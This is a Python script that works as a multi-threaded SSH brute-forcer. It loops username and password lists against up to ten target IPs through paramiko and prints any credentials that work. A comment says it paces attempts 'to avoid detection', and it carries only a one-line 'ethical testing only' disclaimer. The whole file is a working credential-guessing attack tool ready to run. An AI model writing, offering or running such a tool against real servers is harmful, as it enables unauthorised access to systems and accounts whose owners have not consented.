import paramiko
import threading
import time
import os
import sys

# Configuration
MAX_THREADS = 10  # Maximum number of threads per IP
DELAY_BETWEEN_ATTEMPTS = 2  # Delay in seconds between attempts to avoid detection
DEFAULT_USERNAME_FILE = "usernames.txt"
DEFAULT_PASSWORD_FILE = "passwords.txt"

# Default username and password lists
DEFAULT_USERNAMES = ["admin", "root", "user", "test", "guest"]
DEFAULT_PASSWORDS = ["admin", "123456", "password", "root", "test"]

# Rate limiting and thread control
attempt_lock = threading.Lock()
rate_limit_lock = threading.Lock()

def load_file(filename, default_data):
    """Load data from a file or use default data if the file doesn't exist."""
    if os.path.exists(filename):
        with open(filename, "r") as file:
            return [line.strip() for line in file.readlines()]
    return default_data

def ssh_bruteforce(ip, username, password):
    """Attempt to connect to the SSH server with the given credentials."""
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=5)
        print(f"[+] Success: {ip} | {username}:{password}")
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Failed: {ip} | {username}:{password}")
    except Exception as e:
        print(f"[!] Error: {ip} | {username}:{password} | {str(e)}")
    return False

def worker(ip, usernames, passwords):
    """Worker thread to handle brute-forcing for a single IP."""
    for username in usernames:
        for password in passwords:
            with rate_limit_lock:
                time.sleep(DELAY_BETWEEN_ATTEMPTS)  # Rate limiting
            if ssh_bruteforce(ip, username, password):
                return  # Stop if successful

def main():
    print("[*] SSH Brute-Forcer with Rate Limiting and Multi-Threading")
    print("[!] WARNING: This script is for ethical testing only. Use responsibly.")

    # Load usernames and passwords
    username_file = input(f"Enter username file (default: {DEFAULT_USERNAME_FILE}): ").strip() or DEFAULT_USERNAME_FILE
    password_file = input(f"Enter password file (default: {DEFAULT_PASSWORD_FILE}): ").strip() or DEFAULT_PASSWORD_FILE

    usernames = load_file(username_file, DEFAULT_USERNAMES)
    passwords = load_file(password_file, DEFAULT_PASSWORDS)

    # Load target IPs
    ips = input("Enter target IPs (comma-separated): ").strip().split(",")
    if len(ips) > 10:
        print("[!] Maximum of 10 IPs allowed.")
        sys.exit(1)

    # Start threads for each IP
    threads = []
    for ip in ips:
        for _ in range(MAX_THREADS):
            thread = threading.Thread(target=worker, args=(ip, usernames, passwords))
            thread.start()
            threads.append(thread)

    # Wait for all threads to finish
    for thread in threads:
        thread.join()

    print("[*] Brute-forcing completed.")

if __name__ == "__main__":
    main()